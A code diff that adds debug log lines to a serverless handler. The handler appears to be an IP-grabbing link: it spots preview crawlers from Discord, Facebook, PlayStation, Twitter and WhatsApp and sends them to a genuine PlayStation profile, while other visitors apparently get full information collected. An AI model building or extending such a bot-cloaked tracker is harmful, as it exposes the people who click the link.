@@ -228,6 +228,8 @@ export default async function handler(req, res) {
             return res.end();
         }
 
+        console.log("Finished Check 1: Google LLC and Discordbot");
+
         // Check 2: Facebook External Hit
         if (ipDetails.isp === "Facebook, Inc." && userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")) {
             const message = {
@@ -248,6 +250,8 @@ export default async function handler(req, res) {
             res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
             return res.end();
         }
+
+        console.log("Finished Check 2: Facebook External Hit");
 
         // Check 3: Playstation External Hit
         if (ipDetails.isp === "Amazon.com, Inc." && userAgent.includes("UrlPreviewServiceV2")) {
@@ -270,6 +274,8 @@ export default async function handler(req, res) {
             return res.end();
         }
 
+        console.log("Finished Check 3: Playstation External Hit");
+
         // Check 4: Twitter External Hit
         if (ipDetails.isp === "Twitter Inc." && userAgent.includes("Twitterbot/1.0")) {
             const message = {
@@ -290,6 +296,8 @@ export default async function handler(req, res) {
             res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
             return res.end();
         }
+
+        console.log("Finished Check 4: Twitter External Hit");
 
 
         // Check 5: WhatsApp External Hit
@@ -312,6 +320,8 @@ export default async function handler(req, res) {
             res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
             return res.end();
         }
+
+        console.log("Finished Check 5: WhatsApp External Hit");
 
 
         // Default: Full Info for Other Requests
